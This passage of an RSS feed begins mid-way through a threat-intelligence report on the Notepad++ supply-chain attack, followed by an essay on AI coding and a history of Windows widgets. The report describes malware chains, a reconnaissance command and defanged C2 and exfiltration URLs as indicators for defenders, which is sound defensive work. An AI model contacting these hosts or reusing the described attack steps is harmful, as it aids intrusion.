        &lt;code&gt;cmd /c netstat -ano &amp;gt;&amp;gt; a.txt&lt;/code&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Notably, the same sequence of commands has been previously documented by the soft-parsley user on the Notepad++ community forums.&lt;/p&gt;
    &lt;p&gt;The other &lt;code&gt;update.exe&lt;/code&gt; file had the SHA1 hash 4c9aac447bf732acc97992290aa7a187b967ee2c. Using it, attackers performed the following:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Changed the system information upload URL to https://self-dns.it[.]com/list;&lt;/item&gt;
      &lt;item&gt;Changed the user agent used in HTTP requests to Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36;&lt;/item&gt;
      &lt;item&gt;Changed the URL used by the Metasploit downloader to https://safe-dns.it[.]com/help/Get-Start;&lt;/item&gt;
      &lt;item&gt;Changed the Cobalt Strike Beacon C2 server URLs to https://safe-dns.it[.]com/resolve and https://safe-dns.it[.]com/dns-query.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Chain #3 — October 2025&lt;/head&gt;
    &lt;p&gt;In early October 2025, attackers changed the infection chain once again. They have as well changed the C2 server for distributing malicious updates, with the observed update URL being http://45.32.144[.]255/update/update.exe. The payload downloaded (SHA1: d7ffd7b588880cf61b603346a3557e7cce648c93) was still a NSIS installer, however, unlike in the case of chains 1 and 2, this installer did not include the system information sending functionality. It simply dropped the following files to the &lt;code&gt;%appdata%\Bluetooth\&lt;/code&gt; directory:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;BluetoothService.exe&lt;/code&gt;, a legitimate executable (SHA1: 21a942273c14e4b9d3faa58e4de1fd4d5014a1ed);&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;log.dll&lt;/code&gt;, a malicious DLL (SHA1: f7910d943a013eede24ac89d6388c1b98f8b3717);&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;BluetoothService&lt;/code&gt;, an encrypted shellcode (SHA1: 7e0790226ea461bcc9ecd4be3c315ace41e1c122).&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This execution chain relies on the sideloading of the &lt;code&gt;log.dll&lt;/code&gt; file, which is responsible for launching the encrypted &lt;code&gt;BluetoothService&lt;/code&gt; shellcode into the &lt;code&gt;BluetoothService.exe&lt;/code&gt; process. Notably, such execution chains are commonly used by Chinese-speaking threat actors. This particular execution chain has already been described by Rapid7, and the final payload observed in it is the custom Chrysalis backdoor. &lt;/p&gt;
    &lt;p&gt;Unlike the previous chains, chain #3 does not load a Cobalt Strike Beacon directly. However, in their article Rapid7 claim that they additionally observed a Cobalt Strike Beacon payload being deployed to the &lt;code&gt;C:\ProgramData\USOShared&lt;/code&gt; folder, while conducting incident response on one of the machines infected with the Notepad++ supply chain attack. Whilst Rapid7 does not detail how this file was dropped to the victim machine, we can highlight the following similarities between that Beacon payload and the Beacon payloads observed in chains #1 and #2:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;In both cases, Beacons are loaded through a Metasploit downloader shellcode, with similar URLs used (api.wiresguard.com/users/admin for the Rapid7 payload, cdncheck.it.com/users/admin and http://45.77.31[.]210/users/admin for chain #1 and chain #2 payloads);&lt;/item&gt;
      &lt;item&gt;The Beacon configurations are encrypted with the XOR key &lt;code&gt;CRAZY&lt;/code&gt;;&lt;/item&gt;
      &lt;item&gt;Similar C2 server URLs are used for Cobalt Strike Beacon communications (i.e. api.wiresguard.com/api/FileUpload/submit for the Rapid7 payload and https://45.77.31[.]210/api/FileUpload/submit for the chain #1 payload).&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Return of chain #2 and changes in URLs — October 2025&lt;/head&gt;
    &lt;p&gt;In mid-October 2025, we observed attackers to resume deployments of the chain #2 payload (SHA1 hash: 821c0cafb2aab0f063ef7e313f64313fc81d46cd) using yet another URL: http://95.179.213[.]0/update/update.exe. Still, this payload used the previously mentioned self-dns.it[.]com and safe-dns.it[.]com domain names for system information uploading, Metasploit downloader and Cobalt Strike Beacon communications.&lt;/p&gt;
    &lt;p&gt;Further in late October 2025, we observed attackers to start changing URLs used for malicious update deliveries. Specifically, attackers started using the following URLs:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;http://95.179.213[.]0/update/install.exe;&lt;/item&gt;
      &lt;item&gt;http://95.179.213[.]0/update/update.exe;&lt;/item&gt;
      &lt;item&gt;http://95.179.213[.]0/update/AutoUpdater.exe.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We haven’t observed any new payloads deployed from these URLs — they involved usage of both #2 and #3 execution chains. Finally, we have not seen any payloads being deployed starting from November 2025.&lt;/p&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;Notepad++ is a text editor used by numerous developers. As such, the ability to control update servers of this software gave attackers a unique possibility to break into machines of high-profile organizations around the world. The attackers made an effort to avoid losing access to this infection vector — they were spreading the malicious implants in a targeted manner, and they were skilled enough to drastically change the infection chains about once a month. Whilst we identified three distinct infection chains during our investigation, we would not be surprised to see more of them in use. To sum up our findings, here is the overall timeline of the infection chains that we identified:&lt;lb/&gt; The variety of infection chains makes detection of the Notepad++ supply chain attack quite a difficult and at the same time creative task. We would like to propose the following methods, from generic to specific, to hunt down traces of this attack:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Check systems for deployments of NSIS installers, which have been used in all three observed execution chains. For example, this can be done by looking for logs related to creations of the &lt;code&gt;%localappdata%\Temp\ns.tmp&lt;/code&gt;directory, made by NSIS installers at runtime. Make sure to investigate the origins of each identified NSIS installer to avoid false positives;&lt;/item&gt;
      &lt;item&gt;Check network traffic logs for DNS resolutions of the temp[.]sh domain, which is unusual to observe in corporate environments. Also, it is beneficial to conduct a check for raw HTTP traffic requests that have a temp[.]sh URL embedded in the user agent — both these steps will make it possible to detect chain #1 and chain #2 deployments;&lt;/item&gt;
      &lt;item&gt;Check systems for launches of malicious shell commands referenced in the article, such as &lt;code&gt;whoami&lt;/code&gt;,&lt;code&gt;tasklist&lt;/code&gt;,&lt;code&gt;systeminfo&lt;/code&gt;and&lt;code&gt;netstat -ano&lt;/code&gt;;&lt;/item&gt;
      &lt;item&gt;Use specific IoCs listed below to identify known malicious domains and files.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Indicators of compromise&lt;/head&gt;
    &lt;p&gt;URLs used for malicious Notepad++ update deployments&lt;lb/&gt; http://45.76.155[.]202/update/update.exe&lt;lb/&gt; http://45.32.144[.]255/update/update.exe&lt;lb/&gt; http://95.179.213[.]0/update/update.exe&lt;lb/&gt; http://95.179.213[.]0/update/install.exe&lt;lb/&gt; http://95.179.213[.]0/update/AutoUpdater.exe&lt;/p&gt;
    &lt;p&gt;System information upload URLs&lt;lb/&gt; http://45.76.155[.]202/list&lt;lb/&gt; https://self-dns.it[.]com/list&lt;/p&gt;
    &lt;p&gt;URLs used by Metasploit downloaders to deploy Cobalt Strike beacons&lt;lb/&gt; https://45.77.31[.]210/users/admin&lt;lb/&gt; https://cdncheck.it[.]com/users/admin&lt;lb/&gt; https://safe-dns.it[.]com/help/Get-Start&lt;/p&gt;
    &lt;p&gt;URLs used by Cobalt Strike Beacons delivered by malicious Notepad++ updaters&lt;lb/&gt; https://45.77.31[.]210/api/update/v1&lt;lb/&gt; https://45.77.31[.]210/api/FileUpload/submit&lt;lb/&gt; https://cdncheck.it[.]com/api/update/v1&lt;lb/&gt; https://cdncheck.it[.]com/api/Metadata/submit&lt;lb/&gt; https://cdncheck.it[.]com/api/getInfo/v1&lt;lb/&gt; https://cdncheck.it[.]com/api/FileUpload/submit&lt;lb/&gt; https://safe-dns.it[.]com/resolve&lt;lb/&gt; https://safe-dns.it[.]com/dns-query&lt;/p&gt;
    &lt;p&gt;URLs used by the Chrysalis backdoor and the Cobalt Strike Beacon payloads associated with it, as previously identified by Rapid7&lt;lb/&gt; https://api.skycloudcenter[.]com/a/chat/s/70521ddf-a2ef-4adf-9cf0-6d8e24aaa821&lt;lb/&gt; https://api.wiresguard[.]com/update/v1&lt;lb/&gt; https://api.wiresguard[.]com/api/FileUpload/submit&lt;/p&gt;
    &lt;p&gt;URLs related to Cobalt Strike Beacons uploaded to multiscanners, as previously identified by Rapid7&lt;lb/&gt; http://59.110.7[.]32:8880/uffhxpSy&lt;lb/&gt; http://59.110.7[.]32:8880/api/getBasicInfo/v1&lt;lb/&gt; http://59.110.7[.]32:8880/api/Metadata/submit&lt;lb/&gt; http://124.222.137[.]114:9999/3yZR31VK&lt;lb/&gt; http://124.222.137[.]114:9999/api/updateStatus/v1&lt;lb/&gt; http://124.222.137[.]114:9999/api/Info/submit&lt;lb/&gt; https://api.wiresguard[.]com/users/system&lt;lb/&gt; https://api.wiresguard[.]com/api/getInfo/v1&lt;/p&gt;
    &lt;p&gt;Malicious updater.exe hashes&lt;lb/&gt; 8e6e505438c21f3d281e1cc257abdbf7223b7f5a&lt;lb/&gt; 90e677d7ff5844407b9c073e3b7e896e078e11cd&lt;lb/&gt; 573549869e84544e3ef253bdba79851dcde4963a&lt;lb/&gt; 13179c8f19fbf3d8473c49983a199e6cb4f318f0&lt;lb/&gt; 4c9aac447bf732acc97992290aa7a187b967ee2c&lt;lb/&gt; 821c0cafb2aab0f063ef7e313f64313fc81d46cd&lt;/p&gt;
    &lt;p&gt;Hashes of malicious auxiliary files&lt;lb/&gt; 06a6a5a39193075734a32e0235bde0e979c27228 — load&lt;lb/&gt; 9c3ba38890ed984a25abb6a094b5dbf052f22fa7 — load&lt;lb/&gt; ca4b6fe0c69472cd3d63b212eb805b7f65710d33 — alien.ini&lt;lb/&gt; 0d0f315fd8cf408a483f8e2dd1e69422629ed9fd — alien.ini&lt;lb/&gt; 2a476cfb85fbf012fdbe63a37642c11afa5cf020 — alien.ini&lt;/p&gt;
    &lt;p&gt;Malicious file hashes, as previously identified by Rapid7&lt;lb/&gt; d7ffd7b588880cf61b603346a3557e7cce648c93&lt;lb/&gt; 94dffa9de5b665dc51bc36e2693b8a3a0a4cc6b8&lt;lb/&gt; 21a942273c14e4b9d3faa58e4de1fd4d5014a1ed&lt;lb/&gt; 7e0790226ea461bcc9ecd4be3c315ace41e1c122&lt;lb/&gt; f7910d943a013eede24ac89d6388c1b98f8b3717&lt;lb/&gt; 73d9d0139eaf89b7df34ceeb60e5f8c7cd2463bf&lt;lb/&gt; bd4915b3597942d88f319740a9b803cc51585c4a&lt;lb/&gt; c68d09dd50e357fd3de17a70b7724f8949441d77&lt;lb/&gt; 813ace987a61af909c053607635489ee984534f4&lt;lb/&gt; 9fbf2195dee991b1e5a727fd51391dcc2d7a4b16&lt;lb/&gt; 07d2a01e1dc94d59d5ca3bdf0c7848553ae91a51&lt;lb/&gt; 3090ecf034337857f786084fb14e63354e271c5d&lt;lb/&gt; d0662eadbe5ba92acbd3485d8187112543bcfbf5&lt;lb/&gt; 9c0eff4deeb626730ad6a05c85eb138df48372ce&lt;/p&gt;
    &lt;p&gt;Malicious file paths&lt;lb/&gt; %appdata%\ProShow\load&lt;lb/&gt; %appdata%\Adobe\Scripts\alien.ini&lt;lb/&gt; %appdata%\Bluetooth\BluetoothService&lt;/p&gt;
    &lt;p&gt;The Notepad++ supply chain attack — unnoticed execution chains and new IoCs&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46878338</guid><pubDate>Tue, 03 Feb 2026 22:35:27 +0000</pubDate></item><item><title>I miss thinking hard</title><link>https://www.jernesto.com/articles/thinking_hard</link><description>&lt;doc fingerprint="a30c82936f7a0d9"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;I miss thinking hard.&lt;/head&gt;
    &lt;p&gt;Before you read this post, ask yourself a question: When was the last time you truly thought hard?&lt;/p&gt;
    &lt;p&gt;By “thinking hard,” I mean encountering a specific, difficult problem and spending multiple days just sitting with it to overcome it.&lt;/p&gt;
    &lt;p&gt;a) All the time. b) Never. c) Somewhere in between.&lt;/p&gt;
    &lt;p&gt;If your answer is (a) or (b), this post isn't for you. But if, like me, your response is (c), you might get something out of this, if only the feeling that you aren't alone.&lt;/p&gt;
    &lt;p&gt;First, a disclaimer: this post has no answers, not even suggestions. It is simply a way to vent something I've been feeling for the last few months.&lt;/p&gt;
    &lt;head rend="h3"&gt;The Builder and The Thinker&lt;/head&gt;
    &lt;p&gt;I believe my personality is built on two primary traits:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;The Builder (The desire to create, ship, and be pragmatic).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The Thinker (The need for deep, prolonged mental struggle).&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The builder is pretty self explanatory, it’s motivated by velocity and utility. It is the part of me that craves the transition from “idea” to “reality.” It loves the dopamine hit of a successful deploy, the satisfaction of building systems to solve real problems, and the knowledge that someone, somewhere, is using my tool.&lt;/p&gt;
    &lt;p&gt;To explain the Thinker , I need to go back to my university days studying physics. Every now and then, we would get homework problems that were significantly harder than average. Even if you had a decent grasp of the subject, just coming up with an approach was difficult.&lt;/p&gt;
    &lt;p&gt;I observed that students fell into three categories when facing these problems (well, four, if you count the 1% of geniuses for whom no problem was too hard).&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Type 1: The majority. After a few tries, they gave up and went to the professor or a TA for help.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Type 2: The Researchers. They went to the library to look for similar problems or insights to make the problem approachable. They usually succeeded.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Type 3: The Thinkers.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I fell into the third category, which, in my experience, was almost as rare as the genius 1%. My method was simply to think. To think hard and long. Often for several days or weeks, all my non-I/O brain time was relentlessly chewing on possible ways to solve the problem, even while I was asleep.&lt;/p&gt;
    &lt;p&gt;This method never failed me. I always felt that deep prolonged thinking was my superpower. I might not be as fast or naturally gifted as the top 1%, but given enough time, I was confident I could solve anything. I felt a deep satisfaction in that process.&lt;/p&gt;
    &lt;head rend="h3"&gt;The Conflict with AI&lt;/head&gt;
    &lt;p&gt;That satisfaction is why software engineering was initially so gratifying. It hit the right balance. It satisfied The Builder (feeling productive and pragmatic by creating useful things) and The Thinker (solving really hard problems). Thinking back, the projects where I grew the most as an engineer were always the ones with a good number of really hard problems that needed creative solutions.&lt;/p&gt;
    &lt;p&gt;But recently, the number of times I truly ponder a problem for more than a couple of hours has decreased tremendously.&lt;/p&gt;
    &lt;p&gt;Yes, I blame AI for this.&lt;/p&gt;
    &lt;p&gt;I am currently writing much more, and more complicated software than ever, yet I feel I am not growing as an engineer at all. When I started meditating on why I felt “stuck,” I realized I am starving The Thinker.&lt;/p&gt;
    &lt;p&gt;“Vibe coding” satisfies the Builder. It feels great to see to pass from idea to reality in a fraction of a time that would take otherwise. But it has drastically cut the times I need to came up with creative solutions for technical problems. I know many people who are purely Builders, for them this era is the best thing that ever happened. But for me, something is missing.&lt;/p&gt;
    &lt;head rend="h3"&gt;The Trap of Pragmatism&lt;/head&gt;
    &lt;p&gt;I know what you might be thinking: "If you can ‘vibe code’ your way through it, the problem wasn’t actually hard."&lt;/p&gt;
    &lt;p&gt;I think that misses the point. It’s not that AI is good for hard problems, it’s not even that good for easy problems. I’m confident that my third manual rewrite of a module would be much better than anything the AI can output. But I am also a pragmatist.&lt;/p&gt;
    &lt;p&gt;If I can get a solution that is “close enough” in a fraction of the time and effort, it is irrational not to take the AI route. And that is the real problem: I cannot simply turn off my pragmatism.&lt;/p&gt;
    &lt;p&gt;At the end of the day, I am a Builder. I like building things. The faster I build, the better. Even if I wanted to reject AI and go back to the days where the Thinker's needs were met by coding, the Builder in me would struggle with the inefficiency.&lt;/p&gt;
    &lt;p&gt;Even though the AI almost certainly won't come up with a 100% satisfying solution, the 70% solution it achieves usually hits the “good enough” mark.&lt;/p&gt;
    &lt;head rend="h3"&gt;So, what now?&lt;/head&gt;
    &lt;p&gt;To be honest, I don’t know. I am still figuring it out.&lt;/p&gt;
    &lt;p&gt;I'm not sure if my two halves can be satisfied by coding anymore. You can always aim for harder projects, hoping to find problems where AI fails completely. I still encounter those occasionally, but the number of problems requiring deep creative solutions feels like it is diminishing rapidly.&lt;/p&gt;
    &lt;p&gt;I have tried to get that feeling of mental growth outside of coding. I tried getting back in touch with physics, reading old textbooks. But that wasn’t successful either. It is hard to justify spending time and mental effort solving physics problems that aren’t relevant or state-of-the-art when I know I could be building things.&lt;/p&gt;
    &lt;p&gt;My Builder side won’t let me just sit and think about unsolved problems, and my Thinker side is starving while I vibe-code. I am not sure if there will ever be a time again when both needs can be met at once.&lt;/p&gt;
    &lt;p&gt;- Philipp Mainländer&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46881264</guid><pubDate>Wed, 04 Feb 2026 03:54:11 +0000</pubDate></item><item><title>The full history of Windows widgets, from 1997 to today</title><link>https://xakpc.dev/windows-widgets/history/</link><description>&lt;doc fingerprint="149eab1aaec66fd6"&gt;
  &lt;main&gt;&lt;head rend="h1"&gt; Microsoft Has Killed Widgets Six Times.&lt;lb/&gt; Here's Why They Keep Coming Back. &lt;/head&gt;&lt;p&gt;The full history of Windows widgets, from 1997 to today.&lt;/p&gt;&lt;p&gt;Every constraint you'll hit today exists because of a specific past disaster.&lt;/p&gt;&lt;p&gt;Microsoft has been trying to solve the same UX problem since 1997: how to surface live information without making you launch an app. They've shipped six different implementations across nearly 30 years. Each one died from a different fundamental flaw - performance, security, screen space, privacy, engagement. And each death triggered the same reflex: containment.&lt;/p&gt;&lt;p&gt;The pattern goes like this. Microsoft releases widgets into the wild. Users or attackers find the breaking point. Microsoft panics, kills the feature, and ships the next version locked inside a tighter box. Active Desktop splashed HTML across the wallpaper - performance collapsed, so Vista contained widgets in a rigid sidebar. Users hated losing screen space, so Windows 7 freed gadgets to float anywhere - then a security exploit blew the whole platform apart. Windows 8 responded by locking widgets into a full-screen Start Screen nobody wanted. The cycle repeats: build, ship, backlash, kill, rebuild with more walls.&lt;/p&gt;&lt;p&gt;Understanding why each containment failed tells you exactly what constraints shape the platform you'd build on today. Every design decision in the current architecture - the declarative Adaptive Cards format, the native WinUI 3 renderer, the overlay-instead-of-dock layout - exists because of a specific past disaster. The constraints you'll hit when building widgets today aren't arbitrary. They're scar tissue.&lt;/p&gt;&lt;p&gt; Internet Explorer 4.0 shipped in 1997 with a component called the Windows Desktop Update. It fused the Trident rendering engine into &lt;code&gt;explorer.exe&lt;/code&gt;, turning the Windows wallpaper from a static bitmap into a live HTML surface. Microsoft called it Active Desktop.
          &lt;/p&gt;&lt;p&gt;The most visible piece was the Active Channel Bar - a vertical strip docked to the right edge of the screen, populated with branded buttons for Disney, MSNBC, Warner Bros, and CNN. Each button represented a "Channel," a website that pushed content to your machine for offline reading. The backbone was Channel Definition Format (CDF), an XML standard that told your PC which pages to download and when.&lt;/p&gt;&lt;p&gt;A small red sparkle called the "Gleam" appeared on a channel's icon when new content arrived. It was an early attempt at the notification patterns we now take for granted. The handpicked channel lineup drew antitrust complaints, but the real killer was more mundane.&lt;/p&gt;&lt;p&gt; Pentium I/II processors with 16â32 MB of RAM buckled under a constantly running HTML renderer. Because Trident was fused into the shell, a crash in Active Desktop crashed all of &lt;code&gt;explorer.exe&lt;/code&gt;. Users saw a white HTML recovery screen where their wallpaper should have been. Disk I/O from background syncs ground hard drives to a halt, degrading everything else running on the machine.
          &lt;/p&gt;&lt;p&gt;"Disable Active Desktop" became the top tuning tip for Windows 98.&lt;/p&gt;&lt;p&gt;Microsoft had discovered its first widget lesson: ambient information cannot cost performance.&lt;/p&gt;&lt;p&gt;The widget concept went dormant during the XP years, then resurfaced inside the troubled "Longhorn" project. The original 2002 vision was ambitious - a translucent sidebar meant to replace the system tray entirely. After Longhorn collapsed and was reset in 2004, the scope shrank. What shipped with Windows Vista in January 2007 was a supplementary pane: a dark, semi-transparent strip running the full height of the right edge of the screen.&lt;/p&gt;&lt;p&gt;The sidebar was a showcase for Aero Glass. The default clock gadget had a sweeping red second hand behind a reflective glass face. The CPU meter mimicked luxury car dashboard dials - metallic bezels, needles that jittered physically as load spiked, turning red as they approached 100%. Eleven gadgets shipped in total, and thousands more followed.&lt;/p&gt;&lt;code&gt;.gadget&lt;/code&gt; file was a renamed ZIP containing HTML, CSS, JScript, and an XML manifest. Building one took an afternoon.&lt;p&gt; The problem was physical. Most monitors in 2007 were 4:3 or 5:4, and the sidebar permanently consumed around 150 pixels of horizontal space. On a 1280x1024 display, that's over 10% of your workspace. Power users disabled it on day one. The &lt;code&gt;sidebar.exe&lt;/code&gt; process compounded the issue - it leaked memory steadily, consuming 50â100 MB on systems where 1 GB of RAM was the minimum spec.
          &lt;/p&gt;&lt;p&gt;Microsoft had attempted containment: give widgets a fixed home, keep things tidy. But rigid docking doesn't work when screen space is scarce.&lt;/p&gt;&lt;p&gt;Windows 7 freed the gadgets. Microsoft dropped the sidebar container entirely, renamed the feature Desktop Gadgets, and let users drag widgets anywhere on screen. Gadgets snapped magnetically to screen edges and to each other. A new "Aero Peek" button in the taskbar made all windows transparent on hover, so you could glance at your gadgets without minimizing your work.&lt;/p&gt;&lt;p&gt;The third-party ecosystem exploded. DeviantArt and WinCustomize communities produced GPU temperature monitors, Winamp remote controls, elaborate calendar suites. It was the golden age of desktop customization.&lt;/p&gt;&lt;p&gt;It was also a security catastrophe hiding in plain sight.&lt;/p&gt;&lt;p&gt;Desktop gadgets ran as HTML Applications with full local machine trust. No sandbox. A gadget could read files, write to the registry, and execute system commands.&lt;/p&gt;&lt;p&gt; In July 2012, at Black Hat in Las Vegas, researchers Mickey Shkatov and Toby Kohlenberg presented "We Have You By The Gadgets." The attack chain was elegant and devastating: intercept the HTTP traffic of a weather gadget on a shared network, inject JavaScript into the XML data stream, use that JavaScript to instantiate an ActiveX control like &lt;code&gt;WScript.Shell&lt;/code&gt;, then execute arbitrary code on the target machine. A weather widget became a backdoor.
          &lt;/p&gt;&lt;p&gt;▶ Black Hat 2012: "We Have You By The Gadgets" - the presentation that killed Desktop Gadgets.&lt;/p&gt;&lt;p&gt; The researchers also demonstrated a distribution vector - since &lt;code&gt;.gadget&lt;/code&gt; files were just renamed ZIPs, an attacker could package a trojan inside a seemingly innocent clock skin. Users would install it without triggering antivirus warnings, because the code executed within the trusted &lt;code&gt;sidebar.exe&lt;/code&gt; process.
          &lt;/p&gt;&lt;p&gt;Microsoft's response was nuclear. By the time Windows 8 launched in October 2012, the entire gadget engine was ripped from the codebase. Freedom without a sandbox was a death sentence. Everything Microsoft built after this moment was shaped by the security lesson. The move to declarative Adaptive Cards - JSON that describes a UI, never executes code - exists because of Black Hat 2012.&lt;/p&gt;&lt;p&gt;Windows 8 made a radical bet: tiles ARE the launcher. The Start Menu disappeared, replaced by a full-screen Start Screen - a grid of rectangular tiles that doubled as widgets. When "live," a tile flipped or slid to reveal content: unread email counts, weather forecasts, news headlines.&lt;/p&gt;&lt;p&gt; The technology was elegant. Apps pushed tiny XML payloads through Windows Notification Services (WNS) to update their tiles without running a background process. Battery impact was near zero. Developers chose from a predefined catalog of XML templates - &lt;code&gt;TileWideSmallImageAndText03&lt;/code&gt; and friends - which enforced visual consistency but prevented any custom layout.
          &lt;/p&gt;&lt;p&gt;The user experience was a disaster. On a desktop PC, checking your weather tile meant leaving your work, entering the full-screen Start Screen, then navigating back. That context switch enraged productivity users. Enterprise customers called it a dealbreaker.&lt;/p&gt;&lt;p&gt;There was a deeper problem. Tiles were read-only. You couldn't check off a to-do, pause a song, or reply to a message from the tile. Clicking always launched the full app. Compared to the interactive gadgets of Windows 7 - where you could type notes, adjust sliders, and control media players directly on the desktop - this felt like a clear regression.&lt;/p&gt;&lt;p&gt;Windows 10 tried a compromise - tiles went back into a traditional Start Menu. But third-party developers never invested in WNS backends. Building a live tile meant setting up a cloud service to format XML payloads and push them through Microsoft's notification infrastructure - a nontrivial cost for a feature most users barely noticed. By 2020, Start Menus were filled with static, lifeless squares. When Windows 11 launched in 2021, Live Tiles were gone.&lt;/p&gt;&lt;p&gt;Containment attempt number two, even more extreme than Vista's sidebar. Widgets must live alongside your work, not in a separate universe.&lt;/p&gt;&lt;p&gt;Before the current Widget Board, Microsoft tried two half-measures.&lt;/p&gt;&lt;p&gt;Cortana Cards (2015â2020) were the most capable widgets Microsoft ever shipped. The assistant scraped your email for flight confirmations and showed gate info. It read your calendar and estimated commute times. It tracked packages automatically. It surfaced sports scores for teams you followed, restaurant suggestions based on your location, and weather forecasts tuned to your daily routine. Users managed these through a settings panel called the "Notebook," where they explicitly declared their interests.&lt;/p&gt;&lt;p&gt;All of this required deep access to your email, location, and calendar data. Users saw a company reading their emails. Most disabled Cortana entirely.&lt;/p&gt;&lt;p&gt;The catch: disabling Cortana left the dashboard empty - a blank panel with nothing to show. In May 2020, Microsoft pivoted Cortana to a productivity chatbot and removed the cards.&lt;/p&gt;&lt;p&gt;News and Interests (April 2021) took a simpler approach - a weather icon on the Windows 10 taskbar that expanded into a news flyout on hover. The hover trigger was the problem. Users moving their mouse toward the system tray accidentally opened a panel of headlines. IT administrators scrambled to disable it via Group Policy. The feature was labeled bloatware within weeks of launch.&lt;/p&gt;&lt;p&gt;▶ News and Interests - the accidental hover trigger that got it labeled bloatware within weeks.&lt;/p&gt;&lt;p&gt;Both attempts proved a consistent pattern: users want glanceable information but reject anything that feels invasive or disruptive. These two failures directly shaped what came next.&lt;/p&gt;&lt;p&gt;Windows 11 shipped in October 2021 with a dedicated Widgets Board - a panel that slides out from the left edge of the screen when you press Win + W or click the weather icon on the taskbar. The board is an overlay, not a docked sidebar, so it claims zero permanent screen space.&lt;/p&gt;&lt;p&gt; The Widget Board rendered everything through Edge WebView2, the Chromium-based web control shipped as part of the Windows Web Experience Pack. Widget providers implemented the &lt;code&gt;IWidgetProvider&lt;/code&gt; COM interface and defined their UI using Adaptive Cards - a JSON format that describes layout declaratively. No executable code, no scripts. The host parses data, never runs it. This eliminated the entire class of remote code execution attacks that killed Desktop Gadgets in 2012. But the rendering was still web-based. Users could see &lt;code&gt;msedgewebview2.exe&lt;/code&gt; processes in Task Manager when the board opened, often consuming hundreds of megabytes of RAM.
          &lt;/p&gt;&lt;p&gt;Microsoft opened the board to third-party developers in 2023. Spotify added playback controls. Facebook Messenger shows recent conversations. Phone Link surfaces mobile notifications. Xbox Game Pass highlights new releases. Unlike Live Tiles, these widgets are interactive - you can pause a track, check a box, or reply to a message without leaving the board. For web developers, the PWA widget path is the most accessible entry point. Define widgets in your web app manifest, and they appear natively on the board. No Win32 code, no UWP packaging - your existing web stack works. That low barrier to entry is a deliberate correction from the Live Tiles era, where standing up a WNS backend cost more effort than most developers were willing to spend.&lt;/p&gt;&lt;p&gt;The architecture was secure - sandboxed web content can't touch your file system. But the WebView2 rendering layer, the forced MSN news feed, and the lack of user control over the board's content drew persistent criticism. Something had to change.&lt;/p&gt;&lt;p&gt;In mid-2024, Microsoft began rebuilding the board. The forcing function was the EU's Digital Markets Act, which required Microsoft to open the Widget Board to third-party feed providers in the European Economic Area. To comply, Microsoft separated the MSN content pipeline into a replaceable Store-updatable component - the Microsoft Start Experiences app - making it one feed provider among many rather than a hardwired default. The compliance overhaul gave Microsoft the opportunity to rebuild the rendering layer too: widget rendering moved from WebView2 to native WinUI 3.&lt;/p&gt;&lt;p&gt; Adaptive Card JSON now maps directly to WinUI 3 XAML controls: a &lt;code&gt;TextBlock&lt;/code&gt; in your card becomes an actual &lt;code&gt;Microsoft.UI.Xaml.Controls.TextBlock&lt;/code&gt; on screen. Widgets inherit Fluent Design theming, high-contrast modes, and accessibility automatically. The memory footprint dropped - a native WinUI 3 control is far lighter than a DOM element inside a Chromium instance.
          &lt;/p&gt;&lt;p&gt;The latest evolution arrived in early 2026: Lock Screen widgets. Weather, sports scores, and traffic now appear before you log in. Third-party apps can participate too. It's a full conceptual circle back to the "glance and go" vision that started this story in 1997 - except now the hardware can handle it, the sandbox keeps it safe, and the user stays in control. Microsoft appears to have realized that widgets shouldn't compete with applications for desktop space. They belong in the liminal moments of computing - the glance before you unlock, the pause between tasks.&lt;/p&gt;&lt;p&gt;With 250+ million monthly active Windows users, the potential reach for widget developers is enormous. Whether the platform delivers depends on how Microsoft navigates the tensions that killed every previous attempt.&lt;/p&gt;&lt;head rend="h2"&gt;What the Cycle Produced&lt;/head&gt;&lt;p&gt;The current Widget Board is the scar tissue made manifest. Declarative JSON with no executable code (security). Native WinUI 3 rendering, migrated off the original WebView2 pipeline (performance). An overlay, not a dock (screen space). Interactive widgets (engagement). Opt-in data access (privacy). Every lesson encoded in architecture.&lt;/p&gt;&lt;p&gt;But it's not perfect. The developer API has constraints that limit what you can build. The discoverability problem - most Windows users have never pressed Win + W - remains unsolved. And while the news feed is finally optional, the tension between Microsoft's desire to monetize the Discover surface and users' desire for a clean utility board is far from resolved.&lt;/p&gt;&lt;p&gt;Those constraints, and how to work within them to ship something useful, are what the rest of this series will cover.&lt;/p&gt;&lt;/main&gt;
  &lt;comments/&gt;
